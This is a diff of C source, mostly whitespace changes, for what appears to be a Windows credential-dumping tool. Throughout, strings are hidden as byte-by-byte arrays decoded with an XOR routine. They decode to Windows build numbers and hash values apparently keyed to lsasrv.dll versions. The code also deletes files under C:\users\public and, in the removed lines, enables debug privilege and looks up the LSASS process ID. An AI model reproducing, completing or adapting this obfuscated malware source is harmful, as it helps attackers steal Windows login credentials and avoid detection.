_fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 55; _fuckingstring0[7] = 51; _fuckingstring0[8] = 56; _fuckingstring0[9] = 56; _fuckingstring0[10] = 47; _fuckingstring0[11] = 53; _fuckingstring0[12] = 50; _fuckingstring0[13] = 48; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde25 = (char*)malloc(100); memcpy(_caoniamde25, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 103; _fuckingstring0[1] = 48; _fuckingstring0[2] = 54; _fuckingstring0[3] = 53; _fuckingstring0[4] = 49; _fuckingstring0[5] = 56; _fuckingstring0[6] = 101; _fuckingstring0[7] = 101; _fuckingstring0[8] = 98; _fuckingstring0[9] = 56; _fuckingstring0[10] = 96; _fuckingstring0[11] = 54; _fuckingstring0[12] = 56; _fuckingstring0[13] = 53; _fuckingstring0[14] = 100; _fuckingstring0[15] = 99; _fuckingstring0[16] = 50; _fuckingstring0[17] = 56; _fuckingstring0[18] = 98; _fuckingstring0[19] = 103; _fuckingstring0[20] = 98; _fuckingstring0[21] = 101; _fuckingstring0[22] = 51; _fuckingstring0[23] = 48; _fuckingstring0[24] = 101; _fuckingstring0[25] = 51; _fuckingstring0[26] = 98; _fuckingstring0[27] = 57; _fuckingstring0[28] = 53; _fuckingstring0[29] = 98; _fuckingstring0[30] = 55; _fuckingstring0[31] = 103; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde26 = (char*)malloc(100); memcpy(_caoniamde26, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 52; _fuckingstring0[2] = 53; _fuckingstring0[3] = 57; _fuckingstring0[4] = 99; _fuckingstring0[5] = 48; _fuckingstring0[6] = 50; _fuckingstring0[7] = 53; _fuckingstring0[8] = 96; _fuckingstring0[9] = 50; _fuckingstring0[10] = 98; _fuckingstring0[11] = 103; _fuckingstring0[12] = 50; _fuckingstring0[13] = 49; _fuckingstring0[14] = 53; _fuckingstring0[15] = 99; _fuckingstring0[16] = 56; _fuckingstring0[17] = 48; _fuckingstring0[18] = 53; _fuckingstring0[19] = 56; _fuckingstring0[20] = 49; _fuckingstring0[21] = 103; _fuckingstring0[22] = 100; _fuckingstring0[23] = 56; _fuckingstring0[24] = 48; _fuckingstring0[25] = 55; _fuckingstring0[26] = 101; _fuckingstring0[27] = 56; _fuckingstring0[28] = 50; _fuckingstring0[29] = 53; _fuckingstring0[30] = 99; _fuckingstring0[31] = 52; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde27 = (char*)malloc(100); memcpy(_caoniamde27, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 56; _fuckingstring0[1] = 52; _fuckingstring0[2] = 48; _fuckingstring0[3] = 96; _fuckingstring0[4] = 51; _fuckingstring0[5] = 50; _fuckingstring0[6] = 57; _fuckingstring0[7] = 100; _fuckingstring0[8] = 56; _fuckingstring0[9] = 55; _fuckingstring0[10] = 53; _fuckingstring0[11] = 99; _fuckingstring0[12] = 100; _fuckingstring0[13] = 50; _fuckingstring0[14] = 54; _fuckingstring0[15] = 103; _fuckingstring0[16] = 54; _fuckingstring0[17] = 53; _fuckingstring0[18] = 98; _fuckingstring0[19] = 50; _fuckingstring0[20] = 51; _fuckingstring0[21] = 52; _fuckingstring0[22] = 55; _fuckingstring0[23] = 53; _fuckingstring0[24] = 101; _fuckingstring0[25] = 51; _fuckingstring0[26] = 96; _fuckingstring0[27] = 56; _fuckingstring0[28] = 51; _fuckingstring0[29] = 50; _fuckingstring0[30] = 48; _fuckingstring0[31] = 56; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde28 = (char*)malloc(100); memcpy(_caoniamde28, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 101; _fuckingstring0[1] = 101; _fuckingstring0[2] = 57; _fuckingstring0[3] = 98; _fuckingstring0[4] = 96; _fuckingstring0[5] = 98; _fuckingstring0[6] = 98; _fuckingstring0[7] = 100; _fuckingstring0[8] = 49; _fuckingstring0[9] = 51; _fuckingstring0[10] = 49; _fuckingstring0[11] = 56; _fuckingstring0[12] = 100; _fuckingstring0[13] = 52; _fuckingstring0[14] = 103; _fuckingstring0[15] = 54; _fuckingstring0[16] = 98; _fuckingstring0[17] = 53; _fuckingstring0[18] = 98; _fuckingstring0[19] = 50; _fuckingstring0[20] = 48; _fuckingstring0[21] = 54; _fuckingstring0[22] = 51; _fuckingstring0[23] = 49; _fuckingstring0[24] = 100; _fuckingstring0[25] = 51; _fuckingstring0[26] = 53; _fuckingstring0[27] = 48; _fuckingstring0[28] = 54; _fuckingstring0[29] = 57; _fuckingstring0[30] = 103; _fuckingstring0[31] = 49; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde29 = (char*)malloc(100); memcpy(_caoniamde29, _fuckingstring0, 100);
-/*stringarray*/	char* _md5_table[TABLE_LENGTH] = {
+	MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 100; _fuckingstring0[1] = 57; _fuckingstring0[2] = 55; _fuckingstring0[3] = 51; _fuckingstring0[4] = 49; _fuckingstring0[5] = 49; _fuckingstring0[6] = 50; _fuckingstring0[7] = 96; _fuckingstring0[8] = 100; _fuckingstring0[9] = 96; _fuckingstring0[10] = 57; _fuckingstring0[11] = 98; _fuckingstring0[12] = 50; _fuckingstring0[13] = 53; _fuckingstring0[14] = 55; _fuckingstring0[15] = 50; _fuckingstring0[16] = 103; _fuckingstring0[17] = 54; _fuckingstring0[18] = 51; _fuckingstring0[19] = 101; _fuckingstring0[20] = 54; _fuckingstring0[21] = 51; _fuckingstring0[22] = 51; _fuckingstring0[23] = 52; _fuckingstring0[24] = 101; _fuckingstring0[25] = 48; _fuckingstring0[26] = 101; _fuckingstring0[27] = 103; _fuckingstring0[28] = 99; _fuckingstring0[29] = 98; _fuckingstring0[30] = 103; _fuckingstring0[31] = 49; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde15 = (char*)malloc(100); memcpy(_caoniamde15, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 101; _fuckingstring0[1] = 51; _fuckingstring0[2] = 51; _fuckingstring0[3] = 100; _fuckingstring0[4] = 49; _fuckingstring0[5] = 51; _fuckingstring0[6] = 51; _fuckingstring0[7] = 48; _fuckingstring0[8] = 103; _fuckingstring0[9] = 103; _fuckingstring0[10] = 96; _fuckingstring0[11] = 52; _fuckingstring0[12] = 100; _fuckingstring0[13] = 50; _fuckingstring0[14] = 50; _fuckingstring0[15] = 99; _fuckingstring0[16] = 48; _fuckingstring0[17] = 100; _fuckingstring0[18] = 103; _fuckingstring0[19] = 50; _fuckingstring0[20] = 54; _fuckingstring0[21] = 99; _fuckingstring0[22] = 48; _fuckingstring0[23] = 49; _fuckingstring0[24] = 53; _fuckingstring0[25] = 103; _fuckingstring0[26] = 103; _fuckingstring0[27] = 52; _fuckingstring0[28] = 52; _fuckingstring0[29] = 55; _fuckingstring0[30] = 48; _fuckingstring0[31] = 53; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde16 = (char*)malloc(100); memcpy(_caoniamde16, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 54; _fuckingstring0[11] = 52; _fuckingstring0[12] = 48; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde17 = (char*)malloc(100); memcpy(_caoniamde17, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 99; _fuckingstring0[1] = 99; _fuckingstring0[2] = 96; _fuckingstring0[3] = 55; _fuckingstring0[4] = 51; _fuckingstring0[5] = 54; _fuckingstring0[6] = 55; _fuckingstring0[7] = 55; _fuckingstring0[8] = 49; _fuckingstring0[9] = 98; _fuckingstring0[10] = 57; _fuckingstring0[11] = 53; _fuckingstring0[12] = 99; _fuckingstring0[13] = 96; _fuckingstring0[14] = 49; _fuckingstring0[15] = 50; _fuckingstring0[16] = 52; _fuckingstring0[17] = 99; _fuckingstring0[18] = 101; _fuckingstring0[19] = 98; _fuckingstring0[20] = 98; _fuckingstring0[21] = 96; _fuckingstring0[22] = 101; _fuckingstring0[23] = 99; _fuckingstring0[24] = 99; _fuckingstring0[25] = 56; _fuckingstring0[26] = 54; _fuckingstring0[27] = 51; _fuckingstring0[28] = 57; _fuckingstring0[29] = 52; _fuckingstring0[30] = 101; _fuckingstring0[31] = 96; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde18 = (char*)malloc(100); memcpy(_caoniamde18, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 53; _fuckingstring0[7] = 50; _fuckingstring0[8] = 56; _fuckingstring0[9] = 50; _fuckingstring0[10] = 47; _fuckingstring0[11] = 49; _fuckingstring0[12] = 1; FBXorCrypt(_fuckingstring0, 13); char* _caoniamde19 = (char*)malloc(100); memcpy(_caoniamde19, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 99; _fuckingstring0[2] = 96; _fuckingstring0[3] = 53; _fuckingstring0[4] = 49; _fuckingstring0[5] = 101; _fuckingstring0[6] = 48; _fuckingstring0[7] = 52; _fuckingstring0[8] = 53; _fuckingstring0[9] = 51; _fuckingstring0[10] = 55; _fuckingstring0[11] = 103; _fuckingstring0[12] = 100; _fuckingstring0[13] = 52; _fuckingstring0[14] = 55; _fuckingstring0[15] = 57; _fuckingstring0[16] = 100; _fuckingstring0[17] = 53; _fuckingstring0[18] = 53; _fuckingstring0[19] = 50; _fuckingstring0[20] = 96; _fuckingstring0[21] = 52; _fuckingstring0[22] = 51; _fuckingstring0[23] = 100; _fuckingstring0[24] = 49; _fuckingstring0[25] = 49; _fuckingstring0[26] = 57; _fuckingstring0[27] = 101; _fuckingstring0[28] = 99; _fuckingstring0[29] = 48; _fuckingstring0[30] = 101; _fuckingstring0[31] = 54; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde20 = (char*)malloc(100); memcpy(_caoniamde20, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 51; _fuckingstring0[10] = 53; _fuckingstring0[11] = 51; _fuckingstring0[12] = 48; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde21 = (char*)malloc(100); memcpy(_caoniamde21, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 49; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 55; _fuckingstring0[11] = 50; _fuckingstring0[12] = 57; _fuckingstring0[13] = 52; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde22 = (char*)malloc(100); memcpy(_caoniamde22, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 50; _fuckingstring0[3] = 47; _fuckingstring0[4] = 56; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 49; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 55; _fuckingstring0[11] = 50; _fuckingstring0[12] = 57; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde23 = (char*)malloc(100); memcpy(_caoniamde23, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 51; _fuckingstring0[10] = 55; _fuckingstring0[11] = 52; _fuckingstring0[12] = 55; _fuckingstring0[13] = 48; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde24 = (char*)malloc(100); memcpy(_caoniamde24, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 55; _fuckingstring0[7] = 51; _fuckingstring0[8] = 56; _fuckingstring0[9] = 56; _fuckingstring0[10] = 47; _fuckingstring0[11] = 53; _fuckingstring0[12] = 50; _fuckingstring0[13] = 48; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde25 = (char*)malloc(100); memcpy(_caoniamde25, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 103; _fuckingstring0[1] = 48; _fuckingstring0[2] = 54; _fuckingstring0[3] = 53; _fuckingstring0[4] = 49; _fuckingstring0[5] = 56; _fuckingstring0[6] = 101; _fuckingstring0[7] = 101; _fuckingstring0[8] = 98; _fuckingstring0[9] = 56; _fuckingstring0[10] = 96; _fuckingstring0[11] = 54; _fuckingstring0[12] = 56; _fuckingstring0[13] = 53; _fuckingstring0[14] = 100; _fuckingstring0[15] = 99; _fuckingstring0[16] = 50; _fuckingstring0[17] = 56; _fuckingstring0[18] = 98; _fuckingstring0[19] = 103; _fuckingstring0[20] = 98; _fuckingstring0[21] = 101; _fuckingstring0[22] = 51; _fuckingstring0[23] = 48; _fuckingstring0[24] = 101; _fuckingstring0[25] = 51; _fuckingstring0[26] = 98; _fuckingstring0[27] = 57; _fuckingstring0[28] = 53; _fuckingstring0[29] = 98; _fuckingstring0[30] = 55; _fuckingstring0[31] = 103; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde26 = (char*)malloc(100); memcpy(_caoniamde26, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 52; _fuckingstring0[2] = 53; _fuckingstring0[3] = 57; _fuckingstring0[4] = 99; _fuckingstring0[5] = 48; _fuckingstring0[6] = 50; _fuckingstring0[7] = 53; _fuckingstring0[8] = 96; _fuckingstring0[9] = 50; _fuckingstring0[10] = 98; _fuckingstring0[11] = 103; _fuckingstring0[12] = 50; _fuckingstring0[13] = 49; _fuckingstring0[14] = 53; _fuckingstring0[15] = 99; _fuckingstring0[16] = 56; _fuckingstring0[17] = 48; _fuckingstring0[18] = 53; _fuckingstring0[19] = 56; _fuckingstring0[20] = 49; _fuckingstring0[21] = 103; _fuckingstring0[22] = 100; _fuckingstring0[23] = 56; _fuckingstring0[24] = 48; _fuckingstring0[25] = 55; _fuckingstring0[26] = 101; _fuckingstring0[27] = 56; _fuckingstring0[28] = 50; _fuckingstring0[29] = 53; _fuckingstring0[30] = 99; _fuckingstring0[31] = 52; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde27 = (char*)malloc(100); memcpy(_caoniamde27, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 56; _fuckingstring0[1] = 52; _fuckingstring0[2] = 48; _fuckingstring0[3] = 96; _fuckingstring0[4] = 51; _fuckingstring0[5] = 50; _fuckingstring0[6] = 57; _fuckingstring0[7] = 100; _fuckingstring0[8] = 56; _fuckingstring0[9] = 55; _fuckingstring0[10] = 53; _fuckingstring0[11] = 99; _fuckingstring0[12] = 100; _fuckingstring0[13] = 50; _fuckingstring0[14] = 54; _fuckingstring0[15] = 103; _fuckingstring0[16] = 54; _fuckingstring0[17] = 53; _fuckingstring0[18] = 98; _fuckingstring0[19] = 50; _fuckingstring0[20] = 51; _fuckingstring0[21] = 52; _fuckingstring0[22] = 55; _fuckingstring0[23] = 53; _fuckingstring0[24] = 101; _fuckingstring0[25] = 51; _fuckingstring0[26] = 96; _fuckingstring0[27] = 56; _fuckingstring0[28] = 51; _fuckingstring0[29] = 50; _fuckingstring0[30] = 48; _fuckingstring0[31] = 56; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde28 = (char*)malloc(100); memcpy(_caoniamde28, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 101; _fuckingstring0[1] = 101; _fuckingstring0[2] = 57; _fuckingstring0[3] = 98; _fuckingstring0[4] = 96; _fuckingstring0[5] = 98; _fuckingstring0[6] = 98; _fuckingstring0[7] = 100; _fuckingstring0[8] = 49; _fuckingstring0[9] = 51; _fuckingstring0[10] = 49; _fuckingstring0[11] = 56; _fuckingstring0[12] = 100; _fuckingstring0[13] = 52; _fuckingstring0[14] = 103; _fuckingstring0[15] = 54; _fuckingstring0[16] = 98; _fuckingstring0[17] = 53; _fuckingstring0[18] = 98; _fuckingstring0[19] = 50; _fuckingstring0[20] = 48; _fuckingstring0[21] = 54; _fuckingstring0[22] = 51; _fuckingstring0[23] = 49; _fuckingstring0[24] = 100; _fuckingstring0[25] = 51; _fuckingstring0[26] = 53; _fuckingstring0[27] = 48; _fuckingstring0[28] = 54; _fuckingstring0[29] = 57; _fuckingstring0[30] = 103; _fuckingstring0[31] = 49; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde29 = (char*)malloc(100); memcpy(_caoniamde29, _fuckingstring0, 100);
+	/*stringarray*/	char* _md5_table[TABLE_LENGTH] = {
 
-_caoniamde15,
+	_caoniamde15,
 
-_caoniamde16,
+	_caoniamde16,
 
-_caoniamde17,
+	_caoniamde17,
 
-_caoniamde18,
+	_caoniamde18,
 
-_caoniamde19,
+	_caoniamde19,
 
-_caoniamde20,
+	_caoniamde20,
 
-_caoniamde21,
+	_caoniamde21,
 
-_caoniamde22,
+	_caoniamde22,
 
-_caoniamde23,
+	_caoniamde23,
 
-_caoniamde24,
+	_caoniamde24,
 
-_caoniamde25,
+	_caoniamde25,
 
-_caoniamde26,
+	_caoniamde26,
 
-_caoniamde27,
+	_caoniamde27,
 
-_caoniamde28,
+	_caoniamde28,
 
-_caoniamde29
+	_caoniamde29
 
-};/*endarray*/
-char _fuckingstring[100];
-MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 50; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
-if (FBFileExists(_fuckingstring)) {
-
+	};/*endarray*/
+	char _fuckingstring[100];
 	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 50; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
-	DeleteFileA(_fuckingstring);
+	if (FBFileExists(_fuckingstring)) {
 
-}
-
-MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 106; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
-if (FBFileExists(_fuckingstring)) {
-
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 106; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
-	DeleteFileA(_fuckingstring);
-
-}
-
-MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 104; _fuckingstring[19] = 55; _fuckingstring[20] = 96; _fuckingstring[21] = 110; _fuckingstring[22] = 1; FBXorCrypt(_fuckingstring, 23);
-if (FBFileExists(_fuckingstring)) {
-
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 104; _fuckingstring[19] = 55; _fuckingstring[20] = 96; _fuckingstring[21] = 110; _fuckingstring[22] = 1; FBXorCrypt(_fuckingstring, 23);
-	DeleteFileA(_fuckingstring);
-
-}
-
-MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 96; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
-if (FBFileExists(_fuckingstring)) {
-
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 96; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
-	DeleteFileA(_fuckingstring);
-
-}
-
-
-
-
-
-
-
-
-
-
-
-EnableDebugPrivilege();
-
-DWORD pid = GetLsassPid();
-
-// lsasrv.dll3
-
-char* res = (char*)malloc(50);
-
-ZeroMemory(res, 50);
-
-getosversion(res);
-
-//printf("%s\n", res);
-
-	// 
-
-for (int i = 0; i < 1234; i++) {
-
-	if (res[i] == ' ') {
-
-		// 
-
-		res[i] = '\0'; break;
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 50; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
+		DeleteFileA(_fuckingstring);
 
 	}
 
-}
+	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 106; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
+	if (FBFileExists(_fuckingstring)) {
 
-MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 90; _fuckingstring[1] = 43; _fuckingstring[2] = 92; _fuckingstring[3] = 33; _fuckingstring[4] = 119; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 104; _fuckingstring[9] = 110; _fuckingstring[10] = 111; _fuckingstring[11] = 59; _fuckingstring[12] = 33; _fuckingstring[13] = 36; _fuckingstring[14] = 114; _fuckingstring[15] = 11; _fuckingstring[16] = 1; FBXorCrypt(_fuckingstring, 17);
-printf(_fuckingstring, res);
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 106; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
+		DeleteFileA(_fuckingstring);
+
+	}
+
